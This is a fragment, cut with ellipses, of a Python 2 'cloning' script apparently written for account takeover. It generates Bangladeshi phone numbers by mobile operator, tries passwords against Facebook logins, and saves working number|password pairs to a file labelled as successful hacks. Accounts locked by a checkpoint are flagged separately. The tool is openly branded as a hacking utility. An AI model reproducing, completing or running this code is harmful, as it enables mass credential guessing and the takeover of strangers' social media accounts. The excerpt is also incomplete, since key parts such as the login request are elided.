...
os.system('clear')
psb('\x1b[1;32mBANGLADESH 11 DIGIT NUMBER CLONING  ..........')
...
logo = '\x1b[1;97m--------------------------------------------------\n      ---> Create to by -> Rakib Hasan  <--- \n\x1b[1;97m-------------------------------------------------- \n\x1b[1;97m     Facebook -> facebook.com/Rakib.Hasan.Bd.King \x1b[00m\n\x1b[1;97m--------------------------------------------------\n    ---> Github -> github.com/Rakib-143 <--- \n\x1b[1;97m--------------------------------------------------'
...
def menu():
    ...
    print '\x1b[1;91mAUTHOR  : Rakib Hasan'
    print '\x1b[1;91mFACEBOOK : Rakib Hasan'
    print '\x1b[1;91mGITHUB  : github.com/Shiblu-120'
    print ''
    print 50* '-'
    print '\x1b[1;94m--------------------------------------------------'
    print
    print '\x1b[1;91mBANGLADESH ALL OPERETOR CLONNER'
    print
    print '\x1b[1;92m[1]  ROBI (Rakib)h'
    print '\x1b[1;92m[2]  AIRTEL(Rakib)'
    print '\x1b[1;92m[3]  BANGLALINK(Rakib)'
    print '\x1b[1;92m[4]  BANGLALINK(Rakib)'
    print '\x1b[1;92m[5]  GRAMEEN(Rakib)'
    print '\x1b[1;92m[6]  TELETALK(Rakib)'
...
def action():
    ...
    time.sleep(0.5)
    psb('[\xe2\x9c\x93] Please wait, Clonning is running ...')
    time.sleep(0.5)
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[RAKIB-HACK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[Rakib-CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Login 7 Days]\x1b[0m \n'
